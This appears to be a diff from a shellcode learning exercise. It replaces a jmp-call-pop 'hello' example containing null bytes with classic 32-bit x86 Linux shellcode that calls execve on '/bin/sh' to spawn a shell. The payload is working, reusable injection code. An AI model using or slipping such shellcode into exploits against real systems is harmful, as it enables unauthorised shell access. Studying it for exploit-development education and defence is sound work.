@@ -1,17 +1,25 @@
-; this is the original version. it has NULL's in it
+BITS 32
 
-global _start
+Section   .text
+    global _start
 
 _start:
-jmp short pushStringAddress
-payload:
-  mov rax, 4    ; syscall write
-  mov rbx, 1    ; stdout file descriptor is 1
-  pop rcx       ; get the address of the string from the stack
-  mov rdx, 5    ; length of the string
-  int 0x80
-  jmp short end
-pushStringAddress:
-  call payload  ; put the address of the string on the stack
-  db 'hello\n'
-end:
+    jmp short   GotoCall
+
+shellcode:
+    pop         esi
+    xor         eax, eax
+    mov byte    [esi + 7], al
+    lea         ebx, [esi]
+    mov long    [esi + 8], ebx
+    mov long    [esi + 12], eax
+    mov byte    al, 0x0b
+    mov         ebx, esi
+    lea         ecx, [esi + 8]
+    lea         edx, [esi + 12]
+    int         0x80
+
+GotoCall:
+    call        shellcode
+    db          '/bin/sh/JAAAAKKKK'
+
